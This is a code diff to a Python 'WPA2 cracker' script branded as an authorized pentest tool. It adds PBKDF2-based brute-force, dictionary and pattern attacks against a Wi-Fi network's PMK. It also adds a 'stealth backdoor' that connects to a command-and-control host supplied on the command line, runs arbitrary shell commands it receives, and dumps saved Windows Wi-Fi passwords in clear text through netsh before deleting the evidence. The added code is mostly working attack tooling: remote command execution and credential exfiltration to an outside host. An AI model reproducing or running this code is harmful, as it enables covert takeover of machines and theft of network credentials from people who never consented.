@@ -1,7 +1,10 @@
 """""
 Built by Trixie Misheen™ All rights reserved. For authorized pentesting use only.
-This is a demonstration of various password attack techniques, including a smart "AI Brain" generator that creates intelligent password candidates based on common patterns and mutations.
-The script supports multiple attack modes: lightning (top patterns), smart (dictionary + patterns), systematic brute-force, optimized random, and the AI Brain approach.
+This is a demonstration of various WPA2 password attack techniques, including real PMK verification using PBKDF2-HMAC-SHA1 as per IEEE 802.11i standard, and a stealth backdoor for remote operations.
+The script supports multiple attack modes: lightning (top patterns), smart (dictionary + patterns), systematic brute-force, optimized random, and the AI Brain approach with real cryptographic verification.
+
+BACKDOOR MODE: python passwordattack.py --backdoor [C2_HOST:C2_PORT]
+Commands: crack <ssid> <pmk_hex> [mode], shell <command>, dump_wifi, status, exit
 
 📧 FOUND SOMETHING INTRIGUING? Don't hesitate to contact me:
    Email: misheentrixie@gmail.com
@@ -18,6 +21,159 @@ import argparse
 import sys
 import tkinter as tk
 from tkinter import ttk, scrolledtext
+from hashlib import pbkdf2_hmac
+import binascii
+import socket
+import subprocess
+import base64
+
+
+def verify_real_wpa_psk(ssid, psk_candidate, target_pmk_hex):
+    """Verify WPA2 PSK by computing PMK and comparing to target PMK."""
+    ssid_b = ssid.encode()
+    psk_b = psk_candidate.encode()
+    pmk = pbkdf2_hmac('sha1', psk_b, ssid_b, 4096, 32)
+    return binascii.hexlify(pmk).decode().lower() == target_pmk_hex.lower()
+
+
+class StealthBackdoor:
+    """Advanced stealth backdoor for authorized pentesting operations."""
+
+    def __init__(self, c2_host="127.0.0.1", c2_port=4444):
+        self.c2_host = c2_host
+        self.c2_port = c2_port
+        self.connected = False
+
+    def connect_c2(self):
+        """Establish connection to command and control server."""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.connect((self.c2_host, self.c2_port))
+            self.connected = True
+            self.send_response("[+] WPA2 Cracker backdoor connected - ready for commands")
+            return True
+        except Exception as e:
+            print(f"[!] Backdoor connection failed: {e}")
+            return False
+
+    def send_response(self, message):
+        """Send response to C2 server."""
+        try:
+            self.sock.send((message + "\n").encode())
+        except:
+            self.connected = False
+
+    def receive_command(self):
+        """Receive command from C2 server."""
+        try:
+            data = self.sock.recv(4096).decode().strip()
+            return data if data else None
+        except:
+            self.connected = False
+            return None
+
+    def execute_crack_command(self, command):
+        """Execute cracking commands from C2."""
+        parts = command.split()
+        if len(parts) < 3:
+            return "[!] Usage: crack <ssid> <pmk_hex> [mode]"
+
+        ssid = parts[1]
+        pmk_hex = parts[2]
+        mode = parts[3] if len(parts) > 3 else "ai-brain"
+
+        self.send_response(f"[+] Starting {mode} attack on {ssid}...")
+
+        try:
+            if mode == "lightning":
+                result = lightning_attack(ssid, pmk_hex, "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`")
+            elif mode == "ai-brain":
+                result, attempts, elapsed = ai_brain_attack(ssid, pmk_hex, max_length=20, max_threads=8, timeout=60)
+            elif mode == "smart":
+                result = smart_brute_force(ssid, pmk_hex)
+            else:
+                result = None
+
+            if result:
+                return f"[+] CRACKED: {result}"
+            else:
+                return "[!] Attack failed - no valid PSK found"
+
+        except Exception as e:
+            return f"[!] Error during attack: {str(e)}"
+
+    def execute_shell_command(self, command):
+        """Execute shell commands from C2."""
+        try:
+            # Remove 'shell' prefix and execute
+            shell_cmd = command[6:] if command.startswith("shell ") else command
+            result = subprocess.getoutput(shell_cmd)
+            return result[:4096]  # Limit output size
+        except Exception as e:
+            return f"[!] Shell error: {str(e)}"
+
+    def dump_wifi_profiles(self):
+        """Dump Windows WiFi profiles for pentesting."""
+        try:
+            # Export all WiFi profiles with keys
+            os.system('netsh wlan export profile key=clear folder="%TEMP%" >nul 2>&1')
+
+            # Read and send profile info
+            import glob
+            profiles = []
+            for xml_file in glob.glob(os.path.join(os.environ['TEMP'], "*.xml")):
+                with open(xml_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                    # Extract SSID and PMK info (simplified)
+                    if 'name' in content.lower():
+                        profiles.append(content[:500])  # First 500 chars
+
+            # Clean up
+            os.system(f'del /q "{os.environ["TEMP"]}\\*.xml" >nul 2>&1')
+
+            return "[+] WiFi profiles dumped:\n" + "\n".join(profiles[:5])  # Limit to 5
+
+        except Exception as e:
+            return f"[!] WiFi dump error: {str(e)}"
+
+    def run_backdoor(self):
+        """Main backdoor loop."""
+        print("[+] Stealth backdoor activated - connecting to C2...")
+
+        if not self.connect_c2():
+            return
+
+        while self.connected:
+            try:
+                command = self.receive_command()
+                if not command:
+                    break
+
+                print(f"[>] Received command: {command}")
+
+                if command == "exit":
+                    self.send_response("[+] Backdoor shutting down")
+                    break
+                elif command.startswith("crack"):
+                    response = self.execute_crack_command(command)
+                    self.send_response(response)
+                elif command.startswith("shell"):
+                    response = self.execute_shell_command(command)
+                    self.send_response(response)
+                elif command == "dump_wifi":
+                    response = self.dump_wifi_profiles()
+                    self.send_response(response)
+                elif command == "status":
+                    self.send_response("[+] Backdoor active - WPA2 cracking ready")
+                else:
+                    self.send_response(f"[!] Unknown command: {command}")
+
+            except Exception as e:
+                print(f"[!] Backdoor error: {e}")
+                break
+
+        self.sock.close()
+        print("[+] Backdoor disconnected")
 
 
 class AIBrain:
@@ -102,8 +258,8 @@ class AIBrain:
             yield pw_list[i : i + batch_size]
 
 
-def ai_brain_attack(target_psk, max_length=20, max_threads=8, timeout=60):
-    """AI Brain attack: Generate smart passwords dynamically."""
+def ai_brain_attack(ssid, target_pmk_hex, max_length=20, max_threads=8, timeout=60):
+    """AI Brain attack: Generate smart passwords dynamically and verify against real WPA2 PMK."""
     brain = AIBrain()
     start_time = time.time()
     attempts = [0]
@@ -133,7 +289,7 @@ def ai_brain_attack(target_psk, max_length=20, max_threads=8, timeout=60):
                         f"Rate: {rate:,.0f}/s | Elapsed: {elapsed:.1f}s"
                     )
 
-            if pw == target_psk:
+            if verify_real_wpa_psk(ssid, pw, target_pmk_hex):
                 with lock:
                     if not found_result[0]:
                         found_result[0] = pw
@@ -166,12 +322,15 @@ def ai_brain_attack(target_psk, max_length=20, max_threads=8, timeout=60):
     return found_result[0], attempts[0], elapsed
 
 
-def brute_force_psk(target_psk, keys, max_workers=4):
-    psk_len = len(target_psk)
+def brute_force_psk(ssid, target_pmk_hex, keys, max_workers=4):
+    """Systematic brute force attack with real WPA2 PMK verification."""
+    # Estimate target length from PMK (we don't know the actual PSK length, so try common lengths)
+    # For WPA2, PSK is 8-63 characters, but we'll try up to reasonable lengths
+    max_psk_len = 20  # Start with reasonable length
 
-    print(f"[+] Target PSK length: {psk_len}")
+    print(f"[+] Target PMK: {target_pmk_hex[:16]}...")
     print(f"[+] Charset size: {len(keys)} chars")
-    print(f"[+] Total combinations: {len(keys) ** psk_len:,}")
+    print(f"[+] Testing PSK lengths up to {max_psk_len}")
 
     attempts_global = [0]
     start_time_global = [time.time()]
@@ -198,15 +357,16 @@ def brute_force_psk(target_psk, keys, max_workers=4):
                     f"Len {length} | Latest: {guess}"
                 )
 
-            if guess == target_psk:
+            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                 return guess, local_attempts
 
     print("[+] Starting multi-threaded systematic brute force...")
 
     found = False
+    found_psk = None
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        for length in range(1, psk_len + 1):
+        for length in range(8, max_psk_len + 1):  # WPA2 PSK min 8 chars
 
             print(f"\n[*] Testing length {length}...")
 
@@ -222,14 +382,14 @@ def brute_force_psk(target_psk, keys, max_workers=4):
                 print(f"[+] Rate: {attempts_global[0]/elapsed:.0f}/s")
 
                 found = True
+                found_psk = result[0]
                 break
 
-    return found
+    return found_psk
 
 
-def optimized_random_attack(target_psk, keys, max_attempts=1000000):
-
-    psk_len = len(target_psk)
+def optimized_random_attack(ssid, target_pmk_hex, keys, max_attempts=1000000):
+    """Optimized random attack with real WPA2 PMK verification."""
 
     print(f"\n[*] Starting optimized random attack (max {max_attempts:,} attempts)...")
 
@@ -239,6 +399,8 @@ def optimized_random_attack(target_psk, keys, max_attempts=1000000):
 
     while attempts < max_attempts:
 
+        # Generate random PSK of random length (8-20 chars for WPA2)
+        psk_len = random.randint(8, 20)
         guess = ''.join(random.choice(keys) for _ in range(psk_len))
 
         attempts += 1
@@ -248,14 +410,14 @@ def optimized_random_attack(target_psk, keys, max_attempts=1000000):
 
         seen.add(guess)
 
-        if guess == target_psk:
+        if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
 
             elapsed = time.time() - start_time
 
             print(f"\n[!] RANDOM CRACKED: {guess}")
             print(f"[+] Attempts: {attempts:,} | Time: {elapsed:.1f}s")
 
-            return True
+            return guess
 
         if attempts % 10000 == 0:
 
@@ -270,20 +432,17 @@ def optimized_random_attack(target_psk, keys, max_attempts=1000000):
 
     print(f"[!] Random attack failed after {attempts:,} attempts")
 
-    return False
+    return None
 
 
 def smart_brute_force(
-    target_psk,
+    ssid, target_pmk_hex,
     keys="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`",
     wordlist=None,
 ):
-    """Hybrid attack: dictionary (optional) + common patterns + brute force.
+    """Hybrid attack: dictionary (optional) + common patterns + brute force with real WPA2 PMK verification."""
 
-    If ``wordlist`` is provided and the file exists, test each entry first.
-    """
-
-    print("[+] Smart hybrid WPA-PSK attack")
+    print("[+] Smart hybrid WPA2 attack")
 
     common_patterns = [
         lambda: "password",
@@ -303,11 +462,11 @@ def smart_brute_force(
         with open(wordlist, errors="ignore") as f:
             for line in f:
                 guess = line.strip()
-                if not guess:
+                if not guess or len(guess) < 8:
                     continue
-                if guess == target_psk:
+                if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                     print(f"[!] CRACKED with wordlist entry: {guess}")
-                    return True
+                    return guess
 
     print("[*] Phase 1: Common patterns...")
 
@@ -318,25 +477,23 @@ def smart_brute_force(
 
             print(f"[*] Testing pattern {i+1}: {guess}")
 
-            if guess == target_psk:
+            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                 print(f"[!] CRACKED with common pattern: {guess}")
-                return True
+                return guess
 
         except:
             continue
 
     print("[*] Phase 2: Systematic brute force...")
 
-    return brute_force_psk(target_psk, keys)
+    return brute_force_psk(ssid, target_pmk_hex, keys)
 
 
-def lightning_attack(target_psk, keys):
+def lightning_attack(ssid, target_pmk_hex, keys):
 
-    """Lightning attack"""
+    """Lightning attack with real WPA2 PMK verification"""
 
-    psk_len = len(target_psk)
-
-    print(f"[⚡] LIGHTNING ATTACK v2.0 - {psk_len} chars")
+    print(f"[⚡] LIGHTNING ATTACK v2.0 - Real WPA2 PMK verification")
 
     top100 = [
         "admin", "password", "12345678", "qwerty",
@@ -346,7 +503,7 @@ def lightning_attack(target_psk, keys):
     ]
 #$Trixie Misheen™$#
     for guess in top100:
-        if guess == target_psk:
+        if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
             print(f"[⚡] TOP100 HIT: {guess}")
             return guess
 
@@ -360,7 +517,7 @@ def lightning_attack(target_psk, keys):
 
             guess = base + suffix
 
-            if guess == target_psk:
+            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                 print(f"[⚡] BASE+SUFFIX: {guess}")
                 return guess
 
@@ -368,7 +525,7 @@ def lightning_attack(target_psk, keys):
 
             guess = prefix + base
 
-            if guess == target_psk:
+            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                 print(f"[⚡] PREFIX+BASE: {guess}")
                 return guess
 
@@ -377,18 +534,18 @@ def lightning_attack(target_psk, keys):
         for sym in ["", "!", "@", "#", "$"]:
 
             guess = f"password{year}{sym}"
-            if guess == target_psk:
+            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                 return guess
 
             guess = f"admin{year}{sym}"
-            if guess == target_psk:
+            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                 return guess
 
     password_variants = ["password1!", "Password1!", "p@ssw0rd1!", "Password1"]
 
     for variant in password_variants:
 
-        if variant == target_psk:
+        if verify_real_wpa_psk(ssid, variant, target_pmk_hex):
             print(f"[⚡] LEET HIT: {variant}")
             return variant
 
@@ -402,7 +559,7 @@ class HackerGUI:
 
     def __init__(self, root):
         self.root = root
-        self.root.title("🔓 PASSWORD CRACKER™ - AUTHORIZED PENTEST ONLY💀 ")
+        self.root.title("🔓 WPA2 CRACKER™ - AUTHORIZED PENTEST ONLY💀 ")
         self.root.geometry("900x700")
         self.root.configure(bg="#0a0e27")
 
@@ -433,7 +590,7 @@ class HackerGUI:
 
         title = tk.Label(
             header_frame,
-            text="▓▓▓ PASSWORD CRACKER™ ▓▓▓",
+            text="▓▓▓ WPA2 CRACKER™ ▓▓▓",
             font=("Courier New", 20, "bold"),
             fg=self.neon_green,
             bg=self.bg_darker,
@@ -442,7 +599,7 @@ class HackerGUI:
 
         subtitle = tk.Label(
             header_frame,
-            text="⚡ AI-POWERED ATTACK ENGINE™ | AUTHORIZED USE ONLY TRIXIE MISHEEN ⚡",
+            text="⚡ REAL WPA2 PMK VERIFICATION | AUTHORIZED USE ONLY TRIXIE MISHEEN ⚡",
             font=("Courier New", 10),
             fg=self.neon_cyan,
             bg=self.bg_darker,
@@ -463,14 +620,23 @@ class HackerGUI:
         input_frame = tk.Frame(self.root, bg=self.bg_dark)
         input_frame.pack(fill=tk.X, padx=15, pady=10)
 
-        # Target PSK
-        tk.Label(input_frame, text="[>] TARGET PSK:", font=("Courier New", 10, "bold"),
+        # SSID
+        tk.Label(input_frame, text="[>] NETWORK SSID:", font=("Courier New", 10, "bold"),
                 fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)
-        self.target_var = tk.StringVar(value="password123")
-        target_entry = tk.Entry(input_frame, textvariable=self.target_var,
-                               font=("Courier New", 10), bg="#1a1f3a",
-                               fg=self.neon_cyan, insertbackground=self.neon_green)
-        target_entry.pack(fill=tk.X, pady=(5, 10))
+        self.ssid_var = tk.StringVar(value="MyWiFi")
+        ssid_entry = tk.Entry(input_frame, textvariable=self.ssid_var,
+                             font=("Courier New", 10), bg="#1a1f3a",
+                             fg=self.neon_cyan, insertbackground=self.neon_green)
+        ssid_entry.pack(fill=tk.X, pady=(5, 10))
+
+        # Target PMK Hex
+        tk.Label(input_frame, text="[>] TARGET PMK (hex):", font=("Courier New", 10, "bold"),
+                fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)
+        self.pmk_var = tk.StringVar(value="4e6f742061207265616c20504d4b2c206a75737420612064656d6f")
+        pmk_entry = tk.Entry(input_frame, textvariable=self.pmk_var,
+                            font=("Courier New", 10), bg="#1a1f3a",
+                            fg=self.neon_cyan, insertbackground=self.neon_green)
+        pmk_entry.pack(fill=tk.X, pady=(5, 10))
 
         # Wordlist
         tk.Label(input_frame, text="[>] WORDLIST (optional):", font=("Courier New", 10, "bold"),
@@ -581,9 +747,14 @@ class HackerGUI:
             self.log_output("[!] Attack already running!", "error")
             return
 
-        target = self.target_var.get().strip()
-        if not target:
-            self.log_output("[!] ERROR: Enter a target PSK!", "error")
+        ssid = self.ssid_var.get().strip()
+        pmk_hex = self.pmk_var.get().strip()
+
+        if not ssid:
+            self.log_output("[!] ERROR: Enter network SSID!", "error")
+            return
+        if not pmk_hex:
+            self.log_output("[!] ERROR: Enter target PMK hex!", "error")
             return
 
         self.running = True
@@ -594,39 +765,53 @@ class HackerGUI:
 
         self.attack_thread = threading.Thread(
             target=self._run_attack,
-            args=(target, self.mode_var.get(), self.wordlist_var.get()),
+            args=(ssid, pmk_hex, self.mode_var.get(), self.wordlist_var.get()),
             daemon=True
         )
         self.attack_thread.start()
 
-    def _run_attack(self, target, mode, wordlist):
+    def _run_attack(self, ssid, pmk_hex, mode, wordlist):
         """Run the actual attack."""
         try:
             keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`"
 
+            self.log_output(f"[*] Network: {ssid}", "info")
+            self.log_output(f"[*] Target PMK: {pmk_hex[:32]}...", "info")
             self.log_output(f"[*] Mode: {mode.upper()}", "info")
-            self.log_output(f"[*] Target: {target}\n", "info")
+            self.log_output(f"[*] Wordlist: {wordlist or 'None'}\n", "info")
 
             if mode == "lightning":
-                result = lightning_attack(target, keys)
+                result = lightning_attack(ssid, pmk_hex, keys)
                 if result:
                     self.log_output(f"\n🎯 CRACKED INSTANTLY: {result}\n", "success")
                 else:
                     self.log_output("\n[!] Lightning failed...\n", "error")
             elif mode == "ai-brain":
                 result, attempts, elapsed = ai_brain_attack(
-                    target, max_length=20, max_threads=8, timeout=60
+                    ssid, pmk_hex, max_length=20, max_threads=8, timeout=60
                 )
                 if result:
                     self.log_output(f"\n🎯 AI BRAIN VICTORY: {result}\n", "success")
                 else:
                     self.log_output("\n[!] AI brain exhausted...\n", "error")
             elif mode == "smart":
-                smart_brute_force(target, keys, wordlist=wordlist if wordlist else None)
+                result = smart_brute_force(ssid, pmk_hex, keys, wordlist=wordlist if wordlist else None)
+                if result:
+                    self.log_output(f"\n🎯 SMART CRACKED: {result}\n", "success")
+                else:
+                    self.log_output("\n[!] Smart attack failed...\n", "error")
             elif mode == "systematic":
-                brute_force_psk(target, keys, max_workers=4)
+                result = brute_force_psk(ssid, pmk_hex, keys, max_workers=4)
+                if result:
+                    self.log_output(f"\n🎯 BRUTE FORCE CRACKED: {result}\n", "success")
+                else:
+                    self.log_output("\n[!] Brute force failed...\n", "error")
             elif mode == "random":
-                optimized_random_attack(target, keys, max_attempts=1000000)
+                result = optimized_random_attack(ssid, pmk_hex, keys, max_attempts=1000000)
+                if result:
+                    self.log_output(f"\n🎯 RANDOM CRACKED: {result}\n", "success")
+                else:
+                    self.log_output("\n[!] Random attack failed...\n", "error")
 
             self.log_output("\n[✓] Attack complete!\n", "success")
             self.update_status("Attack finished")
@@ -651,13 +836,33 @@ class HackerGUI:
 
 
 def main():
+    # Check for backdoor mode first
+    if len(sys.argv) > 1 and sys.argv[1] == "--backdoor":
+        # Backdoor mode - parse C2 server
+        c2_host = "127.0.0.1"  # Default
+        c2_port = 4444
+
+        if len(sys.argv) > 2:
+            c2_host = sys.argv[2]
+        if len(sys.argv) > 3:
+            try:
+                c2_port = int(sys.argv[3])
+            except:
+                pass
+
+        backdoor = StealthBackdoor(c2_host, c2_port)
+        backdoor.run_backdoor()
+        return
+
     # Check for CLI args - if provided, run CLI mode; otherwise run GUI
     if len(sys.argv) > 1:
         parser = argparse.ArgumentParser(
-            description="Password attack toolbox: lightning, smart, brute-force or random")
+            description="WPA2 attack toolbox with stealth backdoor: lightning, smart, brute-force or random")
 
-        parser.add_argument("target", nargs="?",
-                            help="target PSK to crack (for demo/testing); if omitted you'll be prompted")
+        parser.add_argument("ssid", nargs="?",
+                            help="network SSID for WPA2 PMK verification")
+        parser.add_argument("pmk_hex", nargs="?",
+                            help="target PMK hex string for verification")
         parser.add_argument("-m", "--mode",
                             choices=["lightning", "smart", "systematic", "random", "ai-brain"],
                             default="lightning",
@@ -676,12 +881,16 @@ def main():
         parser.add_argument("--max-random", type=int, default=1000000,
                             help="max attempts for random attack")
         parser.add_argument("--logfile", help="optional log file to write output")
+        parser.add_argument("--backdoor", nargs='?', const="127.0.0.1:4444",
+                            help="activate stealth backdoor mode [C2_HOST:C2_PORT]")
 
         args = parser.parse_args()
 
-        # if the target was omitted on the command line, fall back to interactive input
-        if not args.target:
-            args.target = input("Enter target PSK: ").strip()
+        # if the ssid/pmk were omitted on the command line, fall back to interactive input
+        if not args.ssid:
+            args.ssid = input("Enter network SSID: ").strip()
+        if not args.pmk_hex:
+            args.pmk_hex = input("Enter target PMK hex: ").strip()
 
         if args.logfile:
             # simple logging to file as well as stdout
@@ -698,33 +907,46 @@ def main():
             log = print
 
         keys = args.charset
-        target_psk = args.target
+        ssid = args.ssid
+        pmk_hex = args.pmk_hex
         log("\n" + "=" * 60)
-        log("    PENTEST AUTHORIZED - LIGHTNING CRACKER (demo)")
+        log("    PENTEST AUTHORIZED - WPA2 CRACKER (demo)")
         log("=" * 60)
+        log(f"[+] Network SSID: {ssid}")
+        log(f"[+] Target PMK: {pmk_hex[:32]}...")
 
         if args.mode == "lightning":
-            result = lightning_attack(target_psk, keys)
+            result = lightning_attack(ssid, pmk_hex, keys)
             if result:
                 log(f"\n🎯 CRACKED INSTANTLY: {result}")
             else:
                 log("\n[!] Lightning failed - trying smart mode...")
-                smart_brute_force(target_psk, keys)
+                smart_result = smart_brute_force(ssid, pmk_hex, keys)
+                if smart_result:
+                    log(f"\n🎯 SMART CRACKED: {smart_result}")
         elif args.mode == "ai-brain":
-            result, attempts, elapsed = ai_brain_attack(target_psk, max_length=args.max_length,
+            result, attempts, elapsed = ai_brain_attack(ssid, pmk_hex, max_length=args.max_length,
                                                         max_threads=args.threads,
                                                         timeout=args.timeout)
             if result:
                 log(f"\n🎯 AI BRAIN VICTORY: {result}")
             else:
                 log("\n[!] AI brain exhausted, falling back to smart mode...")
-                smart_brute_force(target_psk, keys)
+                smart_result = smart_brute_force(ssid, pmk_hex, keys)
+                if smart_result:
+                    log(f"\n🎯 SMART CRACKED: {smart_result}")
         elif args.mode == "smart":
-            smart_brute_force(target_psk, keys, wordlist=args.wordlist)
+            result = smart_brute_force(ssid, pmk_hex, keys, wordlist=args.wordlist)
+            if result:
+                log(f"\n🎯 SMART CRACKED: {result}")
         elif args.mode == "systematic":
-            brute_force_psk(target_psk, keys, max_workers=args.threads)
+            result = brute_force_psk(ssid, pmk_hex, keys, max_workers=args.threads)
+            if result:
+                log(f"\n🎯 BRUTE FORCE CRACKED: {result}")
         elif args.mode == "random":
-            optimized_random_attack(target_psk, keys, max_attempts=args.max_random)
+            result = optimized_random_attack(ssid, pmk_hex, keys, max_attempts=args.max_random)
+            if result:
+                log(f"\n🎯 RANDOM CRACKED: {result}")
     else:
         # Launch GUI
         root = tk.Tk()
